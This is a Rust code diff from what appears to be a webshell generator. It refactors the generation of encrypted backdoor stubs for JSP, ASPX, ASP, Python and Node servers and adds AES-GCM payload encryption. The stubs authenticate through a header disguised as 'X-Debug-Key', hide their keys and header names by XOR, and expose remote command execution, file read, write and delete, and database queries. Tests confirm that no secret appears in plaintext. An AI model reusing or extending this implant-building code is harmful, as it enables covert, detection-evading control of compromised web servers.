@@ -677,9 +677,8 @@ impl PayloadEncoder for AeadEncoder {
     ) -> Result<String, ProtocolError> {
         match language {
             "php" => Ok(aead_php_stub_with(password, opts)),
-            other => Err(ProtocolError::NotSupported(format!(
-                "AEAD 暂仅支持 PHP（{other} 待实现）"
-            ))),
+            // 其它语言的 AEAD stub 复用与 NATIVE 相同的业务分发，只替换载荷编解码
+            other => build_non_php_stub(other, password, Some(&crate::aead::ikm_hex(password))),
         }
     }
 }
@@ -2184,6 +2183,120 @@ pub static NATIVE_AES_CBC: NativeEncoder = NativeEncoder { crypto: "aes_cbc" };
 /// NATIVE 静态实例（DES-ECB 载荷加密）。
 pub static NATIVE_DES: NativeEncoder = NativeEncoder { crypto: "des" };
 
+/// 非 PHP 语言的 stub 生成（NATIVE 与 AEAD 共用业务分发，仅替换载荷编解码）。
+///
+/// `aead_ikm`：`Some(SHA256(password) 十六进制)` 时生成 AEAD 版本；
+/// `None` 为历史 XOR 版本。
+fn build_non_php_stub(
+    language: &str,
+    password: &str,
+    aead_ikm: Option<&str>,
+) -> Result<String, ProtocolError> {
+    let h = |op: &str| -> String {
+        let digest = format!("{:x}", md5::Md5::digest(op.as_bytes()));
+        let mut n: u64 = 0;
+        for (i, c) in digest.chars().take(8).enumerate() {
+            n |= (c.to_digit(16).unwrap_or(0) as u64) << (4 * (7 - i));
+        }
+        n.to_string()
+    };
+    let xk = php_ident();
+    let key_hex = md5_hex(password);
+    let token = &key_hex[..16];
+    match language {
+        "jsp" => Ok(jsp_stub(
+            &xk,
+            // JSP 是 servlet API：getHeader 使用**报文头原名**，
+            // 而非 CGI 变量名（HTTP 前缀 + 下划线形式），否则恒为 null → 404
+            &xor_hex("X-Debug-Key", &xk),
+            &xor_hex(token, &xk),
+            &xor_hex(&key_hex, &xk),
+            // Java 的 int 只有 32 位：超过 i32::MAX 的常量必须带 L 后缀
+            &format!("{}L", h("probe")),
+            &format!("{}L", h("exec")),
+            &format!("{}L", h("list")),
+            &format!("{}L", h("read")),
+            &format!("{}L", h("write")),
+            &format!("{}L", h("delete")),
+            &format!("{}L", h("rename")),
+            &format!("{}L", h("mkdir")),
+            &format!("{}L", h("dbprobe")),
+            &format!("{}L", h("dbquery")),
+            aead_ikm,
+        )),
+        "aspx" => Ok(aspx_stub(
+            &xk,
+            // ASP.NET 的 Request.Headers 以**报文头原名**为键（CGI 形式由
+            // stub 内部兜底查询），与 JSP 同因
+            &xor_hex("X-Debug-Key", &xk),
+            &xor_hex(token, &xk),
+            &xor_hex(&key_hex, &xk),
+            &h("probe"),
+            &h("exec"),
+            &h("list"),
+            &h("read"),
+            &h("write"),
+            &h("delete"),
+            &h("rename"),
+            &h("mkdir"),
+            aead_ikm,
+        )),
+        "asp" => {
+            if aead_ikm.is_some() {
+                return Err(ProtocolError::NotSupported(
+                    "经典 ASP（VBScript）没有内置 AES-GCM，AEAD 不可用；                     请改用 native（XOR）或 JSP / ASPX / Python / Node"
+                        .to_string(),
+                ));
+            }
+            Ok(asp_stub(
+                &xk,
+                &xor_hex("HTTP_X_DEBUG_KEY", &xk),
+                &xor_hex(token, &xk),
+                &xor_hex(&key_hex, &xk),
+            ))
+        }
+        "python" => Ok(python_stub(
+            &xk,
+            &xor_hex("HTTP_X_DEBUG_KEY", &xk),
+            &xor_hex(token, &xk),
+            &xor_hex(&key_hex, &xk),
+            &h("probe"),
+            &h("exec"),
+            &h("list"),
+            &h("read"),
+            &h("write"),
+            &h("delete"),
+            &h("rename"),
+            &h("mkdir"),
+            &h("touch"),
+            &h("dbprobe"),
+            &h("dbquery"),
+            aead_ikm,
+        )),
+        "node" => Ok(node_stub(
+            &xk,
+            &xor_hex("HTTP_X_DEBUG_KEY", &xk),
+            &xor_hex(token, &xk),
+            &xor_hex(&key_hex, &xk),
+            &h("probe"),
+            &h("exec"),
+            &h("list"),
+            &h("read"),
+            &h("write"),
+            &h("delete"),
+            &h("rename"),
+            &h("mkdir"),
+            &h("touch"),
+            &h("dbprobe"),
+            &h("dbquery"),
+            aead_ikm,
+        )),
+        other => Err(ProtocolError::NotSupported(format!(
+            "编码器暂不支持语言：{other}（支持 php / jsp / aspx / asp / python / node）"
+        ))),
+    }
+}
+
 impl PayloadEncoder for NativeEncoder {
     fn id(&self) -> &'static str {
         match self.crypto {
@@ -2459,142 +2572,7 @@ impl PayloadEncoder for NativeEncoder {
                     .replace("__XOR__", &format!("{prefix}xor"))
                     .replace("__DEC__", &format!("{prefix}dec")))
             }
-            "jsp" => {
-                // JSP stub：XOR 载荷 + md5 哈希分发 + 命令/文件（无第三方依赖，手动 JSON）
-                let xk = php_ident();
-                let key_hex = md5_hex(password);
-                let token = &key_hex[..16];
-                let h = |op: &str| -> String {
-                    let digest = format!("{:x}", md5::Md5::digest(op.as_bytes()));
-                    let mut n: u64 = 0;
-                    for (i, c) in digest.chars().take(8).enumerate() {
-                        n |= (c.to_digit(16).unwrap_or(0) as u64) << (4 * (7 - i));
-                    }
-                    n.to_string()
-                };
-                Ok(jsp_stub(
-                    &xk,
-                    // JSP 是 servlet API：getHeader 使用**报文头原名**，
-                    // 而非 CGI 变量名（HTTP 前缀 + 下划线形式），否则恒为 null → 404
-                    &xor_hex("X-Debug-Key", &xk),
-                    &xor_hex(token, &xk),
-                    &xor_hex(&key_hex, &xk),
-                    // Java 的 int 只有 32 位：超过 i32::MAX 的常量必须带 L 后缀
-                    &format!("{}L", h("probe")),
-                    &format!("{}L", h("exec")),
-                    &format!("{}L", h("list")),
-                    &format!("{}L", h("read")),
-                    &format!("{}L", h("write")),
-                    &format!("{}L", h("delete")),
-                    &format!("{}L", h("rename")),
-                    &format!("{}L", h("mkdir")),
-                    &format!("{}L", h("dbprobe")),
-                    &format!("{}L", h("dbquery")),
-                ))
-            }
-            "aspx" => {
-                let xk = php_ident();
-                let key_hex = md5_hex(password);
-                let token = &key_hex[..16];
-                let h = |op: &str| -> String {
-                    let digest = format!("{:x}", md5::Md5::digest(op.as_bytes()));
-                    let mut n: u64 = 0;
-                    for (i, c) in digest.chars().take(8).enumerate() {
-                        n |= (c.to_digit(16).unwrap_or(0) as u64) << (4 * (7 - i));
-                    }
-                    n.to_string()
-                };
-                Ok(aspx_stub(
-                    &xk,
-                    // ASP.NET 的 Request.Headers 以**报文头原名**为键（CGI 形式由
-                    // stub 内部兜底查询），与 JSP 同因
-                    &xor_hex("X-Debug-Key", &xk),
-                    &xor_hex(token, &xk),
-                    &xor_hex(&key_hex, &xk),
-                    &h("probe"),
-                    &h("exec"),
-                    &h("list"),
-                    &h("read"),
-                    &h("write"),
-                    &h("delete"),
-                    &h("rename"),
-                    &h("mkdir"),
-                ))
-            }
-            "asp" => {
-                let xk = php_ident();
-                let key_hex = md5_hex(password);
-                let token = &key_hex[..16];
-                Ok(asp_stub(
-                    &xk,
-                    &xor_hex("HTTP_X_DEBUG_KEY", &xk),
-                    &xor_hex(token, &xk),
-                    &xor_hex(&key_hex, &xk),
-                ))
-            }
-            "python" => {
-                let xk = php_ident();
-                let key_hex = md5_hex(password);
-                let token = &key_hex[..16];
-                let h = |op: &str| -> String {
-                    let digest = format!("{:x}", md5::Md5::digest(op.as_bytes()));
-                    let mut n: u64 = 0;
-                    for (i, c) in digest.chars().take(8).enumerate() {
-                        n |= (c.to_digit(16).unwrap_or(0) as u64) << (4 * (7 - i));
-                    }
-                    n.to_string()
-                };
-                Ok(python_stub(
-                    &xk,
-                    &xor_hex("HTTP_X_DEBUG_KEY", &xk),
-                    &xor_hex(token, &xk),
-                    &xor_hex(&key_hex, &xk),
-                    &h("probe"),
-                    &h("exec"),
-                    &h("list"),
-                    &h("read"),
-                    &h("write"),
-                    &h("delete"),
-                    &h("rename"),
-                    &h("mkdir"),
-                    &h("touch"),
-                    &h("dbprobe"),
-                    &h("dbquery"),
-                ))
-            }
-            "node" => {
-                let xk = php_ident();
-                let key_hex = md5_hex(password);
-                let token = &key_hex[..16];
-                let h = |op: &str| -> String {
-                    let digest = format!("{:x}", md5::Md5::digest(op.as_bytes()));
-                    let mut n: u64 = 0;
-                    for (i, c) in digest.chars().take(8).enumerate() {
-                        n |= (c.to_digit(16).unwrap_or(0) as u64) << (4 * (7 - i));
-                    }
-                    n.to_string()
-                };
-                Ok(node_stub(
-                    &xk,
-                    &xor_hex("HTTP_X_DEBUG_KEY", &xk),
-                    &xor_hex(token, &xk),
-                    &xor_hex(&key_hex, &xk),
-                    &h("probe"),
-                    &h("exec"),
-                    &h("list"),
-                    &h("read"),
-                    &h("write"),
-                    &h("delete"),
-                    &h("rename"),
-                    &h("mkdir"),
-                    &h("touch"),
-                    &h("dbprobe"),
-                    &h("dbquery"),
-                ))
-            }
-            other => Err(ProtocolError::NotSupported(format!(
-                "NATIVE 编码器暂仅支持 PHP（{other} 待实现）"
-            ))),
+            other => build_non_php_stub(other, password, None),
         }
     }
 }
@@ -2931,6 +2909,42 @@ mod tests {
         // 密钥派生只用 SHA256(password) 的十六进制形式
         let ikm = crate::aead::ikm_hex("secret");
         assert!(!stub.contains(&ikm), "IKM 应以 XOR 形式嵌入，不能明文");
+    }
+
+    /// AEAD：非 PHP 语言的 stub 生成矩阵。
+    ///
+    /// - 四种语言都能生成（jsp / aspx / python / node）
+    /// - 都带 GCM 实现标记与 `dsw2` 域分隔串
+    /// - IKM（SHA256(密码) 十六进制）必须以 XOR 形式嵌入，不得出现明文
+    /// - 经典 ASP 明确拒绝并说明原因
+    #[test]
+    fn aead_stub_language_matrix() {
+        // 用有辨识度的密码：`secret` 会命中 Python 的 `secrets` 模块名（假阳性）
+        let password = "s3cr3t-pw-9x";
+        let ikm = crate::aead::ikm_hex(password);
+        for (language, marker) in [
+            ("jsp", "GCMParameterSpec"),
+            ("aspx", "DSW_gcmTag"),
+            ("python", "AESGCM"),
+            ("node", "aes-256-gcm"),
+        ] {
+            let stub = AeadEncoder
+                .stub(language, password)
+                .unwrap_or_else(|error| panic!("{language} AEAD stub 生成失败：{error}"));
+            assert!(stub.contains(marker), "{language} stub 应含 {marker}");
+            assert!(stub.contains("dsw2"), "{language} stub 应含域分隔串 dsw2");
+            assert!(
+                stub.contains("dosword/aead/v2"),
+                "{language} stub 应含 HKDF 盐"
+            );
+            assert!(!stub.contains(password), "{language} stub 不应含明文密码");
+            assert!(!stub.contains(&ikm), "{language} IKM 不应明文嵌入");
+        }
+        let error = AeadEncoder.stub("asp", "secret").unwrap_err();
+        assert!(
+            error.to_string().contains("AES-GCM"),
+            "经典 ASP 应说明不支持原因：{error}"
+        );
     }
 
     #[test]
